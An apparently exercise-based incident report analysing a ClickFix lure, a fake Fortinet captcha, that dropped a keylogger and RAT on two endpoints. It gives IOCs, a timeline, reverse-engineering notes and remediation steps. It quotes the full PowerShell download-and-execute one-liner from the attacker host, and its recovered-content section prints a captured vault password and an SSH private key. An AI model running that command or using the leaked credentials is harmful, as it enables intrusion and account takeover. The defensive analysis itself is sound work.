# Incident Report — Kongsberg Endpoint Compromise (2026-03-29)

## Executive Summary

| Item | Value |
|---|---|
| **Date / time of attack** | 2026-03-29, ~17:45 UTC → ~17:54 UTC |
| **Affected hosts** | `anders-desktop` (user `anders`), `john-desktop` (user `john`) |
| **Initial access** | Drive‑by on attacker‑controlled site `f1leshare.net` (10.3.124.26) → fake Fortinet "File Access" page → fake CAPTCHA "ClickFix" social-engineering trick → user pasted `Win+R` PowerShell one-liner |
| **Malware** | `updater.exe` — custom MinGW/GCC C++ infostealer + RAT (x86_64 PE) |
| **C2 infrastructure** | `MiccosoftUpdate.com` (10.3.97.182) – telemetry/exfil; `windowsupdater.tk` (10.3.215.83) – command channel |
| **Crypto** | AES‑128‑ECB. Key derivation: `(secret_string + "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")[:16]`. Telemetry channel keyed on the **username** (`anders`, `john`); command/result channel keyed on the **NetBIOS COMPUTERNAME** (`ANDERS-DESKTOP`, `JOHN-DESKTOP`). PKCS7 padding. Wire framing: `base64( type_byte || ciphertext )`, where `type_byte = 0x01` for keylogger/window/clipboard data, `0x02` for command output. The command channel itself uses no leading type byte. |
| **Persistence** | `%LOCALAPPDATA%\Microsoft\updater.exe`, Startup `msteamsupdater.exe`, registry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`, fake scheduled-task entry `…\Schedule\TaskCache\Tree\MicrosoftUpdater` |
| **Motivation** | Targeted **espionage / data theft against Kongsberg Gruppen** (Norwegian defence contractor). The attacker specifically retrieved a sensitive email (`polen.eml`) describing the unannounced **Polish NASAMS air-defence contract (~3.5–4 BNOK)**, captured Vaultwarden credentials and an OpenSSH ed25519 private key. |
| **Impact** | Confidential commercial information about a multi-billion-NOK defence deal exfiltrated; corporate password-vault account credentials stolen; SSH private key stolen; both endpoints fully RAT‑controlled. |

## Attack Vector — ClickFix via Fake Fortinet Captcha

1. Browser on `anders-desktop` navigates to `http://f1leshare.net/` (10.3.124.26) at **17:46:32**. Page is a fake "Fortinet File Access" prompt (`<title>Fortinet File Access</title>`, served Fortinet logo `/static/fortinet_logo.png`). The form redirects to `/captcha?q=Fortinet/abh4whnesdgbw07f/Important%20Download&email=…`.
2. The `/captcha` page (delivered 17:46:41) is a classic **ClickFix** lure: it displays a CAPTCHA and a "Having trouble verifying?" box that instructs the victim to:
   1. Press `Win+R`
   2. Click "Copy Verification Command"
   3. Paste into Run and press OK
3. The "verification command" is the actual payload (set via JavaScript):
   ```powershell
   powershell -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"
   ```
4. Anders pastes and runs it — at **17:46:55** PowerShell is launched, downloads `updater.exe` to `%TEMP%`, then executes it. Because the keylogger is already running by the time the victim browses other pages, the *same payload is captured back from the clipboard* and exfiltrated by the malware itself (proof below).
5. The exact same chain repeats for `john-desktop`: page hit 17:47:03, captcha 17:47:18, `/download/updater` 17:49:07, `updater.exe` spawned by `powershell.exe` at **17:49:12** as `C:\Users\john\AppData\Local\Temp\updater.exe`.

## Timeline (UTC)

| Time | Host | Event | Source |
|---|---|---|---|
| 17:36:xx | both | Normal RDP / interactive logon, BGInfo loaded | `endpoint.events.process` |
| **17:46:32** | anders | GET `http://f1leshare.net/` — fake Fortinet page | `network_traffic.http` |
| 17:46:41 | anders | GET `/captcha` — ClickFix lure (PowerShell payload in JS) | `network_traffic.http` |
| 17:46:48 | anders | Pasted payload runs `powershell.exe -exec bypass …` | `endpoint.events.process` |
| 17:46:55 | anders | GET `http://f1leshare.net/download/updater` (PE downloaded) | `network_traffic.http` |
| **17:47:20** | anders | `C:\Users\anders\AppData\Local\Temp\updater.exe` spawned by `powershell.exe` | `endpoint.events.process` + `security.alerts` |
| 17:47:19 | anders | First C2 beacon: `POST http://MiccosoftUpdate.com/api/info` plaintext system info | `network_traffic.http` |
| 17:47:19 | anders | First exfil: window title "*New tab and 6 more pages – Profile 1 – Microsoft Edge*" | decrypted `/api/data` |
| 17:47:19 | anders | Clipboard exfil: the **same PowerShell ClickFix command** the victim just pasted | decrypted `/api/data` |
| 17:47:49 | anders | First poll to command channel `windowsupdater.tk/windows/checkforupdate` (idle) | `network_traffic.http` |
| **17:48:20** | anders | C2 command #1: `dir "C:\Users"` — directory enumeration | decrypted command + 376 B response |
| 17:49:12 | john | `updater.exe` spawned on `john-desktop` (same chain) | `endpoint.events.process` |
| 17:49:20 | anders | C2 command #2: `dir "C:\Users\anders\Documents"` | decrypted |
| 17:50:50 | anders | C2 command #3: `dir "C:\Users\anders\Desktop"` (reconnaissance for target file) | decrypted |
| **17:51:50** | anders | C2 command #4: `type "C:\Users\anders\Desktop\polen.eml"` | decrypted |
| **17:51:51** | anders | 1444‑byte exfil of the **full plaintext of `polen.eml`** — internal Kongsberg email about the Polish NASAMS deal | decrypted `/update/servicedata` |
| 17:52:04 | anders | Browsed `https://77vaultwarden.ryo.no` (Vaultwarden) | exfil window title |
| **17:52:28** | anders | Captured login form: `anders2kongsberg.com` / **`anderserkul123`** | decrypted `/api/data` |
| **17:52:40** | anders | OpenSSH **ed25519 private key** captured from clipboard | decrypted `/api/data` |
| 17:52→17:54 | anders | Continued window-title / clipboard / keystroke exfil | decrypted `/api/data` |

Pre/post-attack state was clean: only normal Edge / OneDrive / svchost activity, BGInfo, captive‑portal probes — no other anomalous outbound connections except those listed.

## Reverse-Engineering Summary (Ghidra — `updater.exe`)

| Function (addr) | Role |
|---|---|
| `FUN_140002e83` | Persistence: copies self to `%LOCALAPPDATA%\Microsoft\updater.exe` and `…\Startup\msteamsupdater.exe`, writes `HKCU\…\Run\MicrosoftUpdater`, creates fake `Schedule\TaskCache\Tree\MicrosoftUpdater` registry tree |
| `FUN_140003233` | Main keylogger thread — `GetAsyncKeyState` polling, `GetForegroundWindow`/`GetWindowTextA`, clipboard polling via `OpenClipboard`/`GetClipboardData(1)` |
| `FUN_140001fe4` | Format string `"[CLIPBOARD] %s"` — confirms clipboard exfiltration mechanism |
| `FUN_1400022bb` | Builds `/api/info` body: `"Host:%s\nUser:%s\nArch:%s\nCPUs:%lu\nRAM:%llu MB\n"` using `GetComputerNameA`, `GetUserNameA`, `GetSystemInfo`, `GlobalMemoryStatusEx` |
| `FUN_140001b8c` | AES‑128‑ECB **encrypt** wrapper using `BCryptOpenAlgorithmProvider("AES")`, `BCryptSetProperty(BCRYPT_CHAINING_MODE, "ChainingModeECB")`, `BCryptGenerateSymmetricKey` with key = first 16 bytes of the secret (zero-padded) |
| `FUN_140002884` | AES‑128‑ECB **decrypt** wrapper (mirror of above) — used for incoming C2 commands |
| `FUN_140001df3` | `/api/data` POST: prepends type byte `0x01`, base64-encodes, key = `GetUserNameA()` |
| `FUN_140001e54` | `/update/servicedata` POST: type byte `0x02`, key = `GetComputerNameA()` |
| `FUN_140001ad4` | `POST /update/servicedata` (HTTP wrapper around `HttpOpenRequestA` / `HttpSendRequestA`) |
| `FUN_1400026bf` | Custom base64 decoder (alphabet `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef…` at `0x140012018`) |
| Imports | `bcrypt.dll`: `BCryptOpenAlgorithmProvider`, `BCryptSetProperty`, `BCryptGenerateSymmetricKey`, `BCryptEncrypt`, `BCryptDecrypt`. `wininet.dll`: `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`. `user32.dll`: `GetAsyncKeyState`, `GetForegroundWindow`, `GetWindowTextA`, `OpenClipboard`, `GetClipboardData`. `kernel32.dll`: `CreateMutexA(Global\MicrosoftUpdateMutex)`, `CreateThread`, `GetComputerNameA`. `advapi32.dll`: `GetUserNameA`, `RegCreateKeyExA`, `RegSetValueExA`. |
| Compiler | MinGW GCC 9.3 / 10‑win32 (PE rich header / `.eh_frame` / libgcc) |

## Indicators of Compromise (IOCs) — with proof

### Network IOCs

| IOC | Type | Proof |
|---|---|---|
| `f1leshare.net` (10.3.124.26) | Initial-access C2 / lure | ES `network_traffic.http` 17:46:32 anders → `/`, `/captcha`, `/static/captcha.png`, `/download/updater`; identical hits for john-desktop 17:47:03–17:49:07. Page body contains `<title>Fortinet File Access</title>` and JS that builds the PowerShell payload. |
| `MiccosoftUpdate.com` (10.3.97.182) | Telemetry / exfil C2 (HTTP) | 96 HTTP hits from anders-desktop, paths `/api/info` and `/api/data`; first beacon 17:47:19. |
| `windowsupdater.tk` (10.3.215.83) | Command/result C2 (HTTP) | Paths `/windows/checkforupdate` (poll) and `/update/servicedata` (result). 11 polls + 4 commands from anders-desktop 17:47:49–17:53:21. |
| URL `/download/updater` on `f1leshare.net` | Malware delivery | ES HTTP 17:46:55 (anders), 17:49:07 (john) — payload served from this URL after CAPTCHA "verification". |
| URL `/api/info`, `/api/data`, `/windows/checkforupdate`, `/update/servicedata` | Hard-coded C2 paths | Strings at `0x140013075` (`/update/servicedata`), `0x140013141` (`/windows/checkforupdate`), and inside `FUN_140001df3`/`FUN_140001e54` for `/api/data`/`/api/info`. |
| User-Agent / lack of TLS | All C2 over **plain HTTP** on port 80 | All 96 traffic events captured cleartext (response body visible in ES). |

### Host IOCs

| IOC | Type | Proof |
|---|---|---|
| `C:\Users\<user>\AppData\Local\Temp\updater.exe` | Dropper file | `endpoint.events.process` parent=`powershell.exe` cmdline `"C:\Users\anders\AppData\Local\Temp\updater.exe"` at 17:47:20; same for john at 17:49:12. |
| `%LOCALAPPDATA%\Microsoft\updater.exe` | Persistence copy | `FUN_140002e83`: `CopyFileA(local_118, "%LOCALAPPDATA%\\Microsoft\\updater.exe", 0)`. |
| `%APPDATA%\…\Startup\msteamsupdater.exe` | Persistence (Startup folder) | `FUN_140002e83`: builds `"\\msteams" + "updater.exe"` (`builtin_strncpy` … `0x2e72657461647075` = "updater.") into the `CSIDL_STARTUP` path returned by `SHGetFolderPathA(7)`. |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` | Run-key persistence | `FUN_140002e83`: `RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", …); RegSetValueExA(…, "MicrosoftUpdater", 0, REG_SZ, persistence path, …)`. |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` | Fake scheduled-task tree | `FUN_140002e83`: explicit `RegCreateKeyExA(HKLM, "SOFTWARE\\…\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater", …)` + writes `"SD"` (REG_BINARY) and `"Index"` (REG_DWORD=1). |
| Mutex `Global\MicrosoftUpdateMutex` | Singleton mutex | `kernel32!CreateMutexA` import + string in `.rdata`. |
| Window title `BGInfo - red.bgi` / process `bginfo` | (Benign baseline) | Filters out — appears in normal pre-attack process tree. |

### Behavioural / TTP IOCs

| IOC | Proof |
|---|---|
| **ClickFix Win+R PowerShell payload** | f1leshare.net `/captcha` HTML body literally contains the JS that constructs `powershell -exec bypass -windowstyle hidden -command "… IWR -Uri … /download/updater -OutFile $env:TEMP\updater.exe …; & $env:TEMP\updater.exe"`. The same string is recovered from the **clipboard** of the victim 23 ms after the keylogger first beaconed (17:47:19.884Z `/api/data` decrypted). |
| **GetAsyncKeyState keylogging** | `user32!GetAsyncKeyState` import; `FUN_140003233` polling loop. Window-title bursts every ~30 s in `/api/data` confirm live polling. |
| **Clipboard scraping** | `user32!OpenClipboard`, `GetClipboardData`; `[CLIPBOARD] %s` format string at `FUN_140001fe4`; multiple `[CLIPBOARD] …` lines exfiltrated (PowerShell command, OpenSSH private key). |
| **AES-128-ECB ChainingModeECB** | Direct strings `"AES"` and `"ChainingModeECB"` (UTF-16) referenced from `FUN_140001b8c` / `FUN_140002884`. |
| **Username- / Computername-derived keys** | `FUN_140001df3` calls `GetUserNameA` immediately before invoking the encrypt; `FUN_140001e54` calls `GetComputerNameA`. Confirmed empirically: telemetry decrypts only with `anders\0…`/`john\0…`; commands decrypt only with `ANDERS-DESKTOP\0…`/`JOHN-DESKTOP\0…`. |

## Recovered Exfiltrated Content (proof of impact)

### 1. Internal Kongsberg email — `polen.eml` (the prize)

Recovered by decrypting the 1944-byte base64 body of `POST http://windowsupdater.tk/update/servicedata` at **2026-03-29T17:51:51.101Z** (key = `ANDERS-DESKTOP`). Triggered by attacker command `type "C:\Users\anders\Desktop\polen.eml"` issued 1.4 s earlier:

```
Return-Path: <emil.andersson@kongsberg.com>
Received: from mail.kongsberg.com (mail.kongsberg.com [192.0.2.1])
    by mail.kongsberg.com (8.14.7/8.14.7) with ESMTP id m3L5GdH3001234
    for <anders@kongsberg.com>; Thu, 26 Mar 2026 10:15:00 +0100
From: Emil Andersson <emil.andersson@kongsberg.com>
To: Anders <anders@kongsberg.com>
Subject: Polen NASAMS-avtale
Date: Thu, 26 Mar 2026 10:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

Hei Anders,

Ville bare gi deg en kort oppdatering. Vi har fått bekreftet at de polske
vennene våre har valgt å kjøpe NASAMS fra Kongsberg. Avtalen skal være på
rundt 3,5–4 milliarder kroner, og systemet inkluderer både radar,
kommandoplass og lanseringsenheter med langtrekkende presisjonsraketter.

NASAMS gir betydelig fleksibilitet med integrasjon mot ulike
luftvernsystemer, rask respons på mål i alle høyder og mulighet for
samtidig håndtering av flere trusler. Den valgte pakken innebærer full
logistikk- og vedlikeholdsoppfølging, så kunden får et komplett, operativt
luftvernsystem.

Det innebærer at vi må ansette 40–50 personer i Polen. Har du noen tanker
om hvordan vi kan rekruttere fortest mulig? Vi må få på plass et team
rimelig kvikt.

Noter deg at informasjonen ikke er offentlig kjent, så vær nøye med hvem
du deler dette med.

Med vennlig hilsen,
Emil Andersson
Kongsberg Gruppen
```

This explicitly states the deal value (≈3.5–4 BNOK), confirms confidentiality ("informasjonen ikke er offentlig kjent"), and discusses planned hiring of 40–50 staff in Poland. **This is the explicit motive for the attack** — the ClickFix lure was used to plant a stealer specifically to retrieve this kind of file.

### 2. Vaultwarden credentials

Captured via keystroke logging on `https://77vaultwarden.ryo.no` (window title `Vaultwarden Web`, then `Vaults | Vaultwarden Web`), 2026-03-29T17:52:28.531Z `/api/data`:

```
anders2kongsberg.comanderserkul123
```
(`@` reads as `2` in the keylogger output because Shift+2 is `@` on en-US — i.e. the attacker has `anders@kongsberg.com / anderserkul123`.)

### 3. OpenSSH ed25519 private key (clipboard)

`/api/data` 17:52:40.387:
```
[CLIPBOARD] -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZgAAAIgVG358FRt+
fAAAAAtzc2gtZWQyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZg
AAAEDHlNIvcCmxaoT1pcOn30GIggyG+N4K4DkaxVhJSTv0CxM8V2H66LCe2VMW2gFkvdn3
ev2Y8WsbRH7yBzcnppZmAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
```

### 4. Recon command output (sample)

`anders` directory listings exfiltrated as 376 / 292 / 399-byte AES blobs decrypt to standard `cmd.exe /c dir` output starting `Volume in drive C is OS / Volume Serial Number is D46D-D12D`.

### 5. Plaintext system fingerprint (`/api/info`)

Sent **unencrypted** in the very first request (17:47:19.669Z):
```
Host: ANDERS-DESKTOP
User: anders
Arch: x64
CPUs: 4
RAM: 8185 MB
```

## What likely happened (narrative)

1. The attacker registered three look‑alike domains — **`f1leshare.net`** (typosquat of "fileshare"), **`MiccosoftUpdate.com`** (note the double-c), **`windowsupdater.tk`** — and stood up:
   - a fake Fortinet "secure file share" page on f1leshare.net,
   - a back-end on MiccosoftUpdate.com receiving keylogger/clipboard/window telemetry,
   - a back-end on windowsupdater.tk that issues `cmd.exe`-style commands and receives their output.
2. They social-engineered the targets into the f1leshare.net page (likely a phishing email referencing "Important Download" / "Fortinet abh4whnesdgbw07f"). The page guides the victim to a CAPTCHA, then uses the **ClickFix** technique — telling the user to press Win+R, paste a "verification command", and press Enter. That command silently downloads and runs `updater.exe`.
3. `updater.exe` immediately:
   - establishes persistence in three places,
   - posts a plaintext system fingerprint to `/api/info`,
   - starts a keylogger thread that dumps every foreground window title every ~30 s and every clipboard change to `/api/data` (AES-ECB, key = username),
   - polls `/windows/checkforupdate` every 30 s for AES-encrypted shell commands (key = computername), executes them via `cmd.exe`, and POSTs the output to `/update/servicedata`.
4. A live operator drove the keyboard against `anders-desktop`: enumerated `C:\Users`, then `C:\Users\anders\Documents`, then `C:\Users\anders\Desktop`, found `polen.eml`, and dumped it. Total time from infection to exfil of the Kongsberg NASAMS-Polen email: **≈4 min 31 s**.
5. Anders was using a password manager (Vaultwarden) and apparently pasted an SSH private key during the same session — both were captured automatically by the keylogger/clipboard monitor, even without explicit operator commands.
6. `john-desktop` was infected the same way ~2 minutes later but no operator commands were observed against it within the captured window — only the initial download was seen.

## Recommendations (concise)

- Block / sinkhole the three domains and the three IPs at the perimeter; alert on any past resolutions.
- Reset `anders@kongsberg.com` Vaultwarden master password (`anderserkul123` is fully compromised) and rotate every secret stored in that vault. Treat it as full vault disclosure.
- Revoke and re-issue the leaked SSH ed25519 key; audit servers for `authorized_keys` containing it.
- Re-image both endpoints. Remove `%LOCALAPPDATA%\Microsoft\updater.exe`, the Startup `msteamsupdater.exe`, the `Run\MicrosoftUpdater` value, and the `Schedule\TaskCache\Tree\MicrosoftUpdater` registry tree.
- Hunt enterprise-wide for the same updater hash, the mutex `Global\MicrosoftUpdateMutex`, outbound HTTP POSTs to `/api/info`/`/api/data`/`/windows/checkforupdate`/`/update/servicedata`, and Win+R-launched PowerShell with `IWR … -OutFile $env:TEMP`.
- Communicate with Kongsberg leadership: assume the Polish NASAMS deal terms, projected pricing, and hiring plans are now in adversary hands.
